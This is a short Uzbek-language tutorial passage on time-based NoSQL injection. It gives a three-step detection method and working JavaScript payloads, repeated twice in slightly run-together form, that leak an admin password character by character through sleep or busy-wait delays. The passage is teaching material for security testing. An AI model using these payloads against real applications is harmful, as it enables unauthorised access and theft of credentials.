Vaqtga asoslangan injeksiya
Ba'zan ma'lumotlar bazasida xatoni ishga tushirish ilovaning javobida hech qanday farq keltirib chiqarmaydi. Bunday holatda JavaScript injeksiyasidan foydalanib shartli vaqt kechikishini (time delay) yuzaga keltirish orqali zaiflikni aniqlash va ekspluatatsiya qilish mumkin.

Vaqtga asoslangan NoSQL injeksiyasini qanday o'tkazish:

1. Sahifani bir necha marta yuklab, yuklanish vaqtining asosiy (baseline) qiymatini aniqlang.
2. Kiritishga vaqtga asoslangan payload joylashtiring. Vaqtga asoslangan payload bajarilganda javobda maqsadli kechikish yuzaga keladi. Masalan, `{"$where": "sleep(5000)"}` muvaffaqiyatli injeksiya bo'lganda 5000 ms kechikish keltirib chiqaradi.
3. Javob sekinroq yuklanishini aniqlang. Agar yuklanish sekinlashsa — bu muvaffaqiyatli injeksiya belgisi bo'ladi.

Quyidagi vaqtga asoslangan payloadlar parolning birinchi harfi `a` bo'lsa vaqt kechikishini keltirib chiqaradi:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

(oxirgi ikkita qator — payload misollaridir)
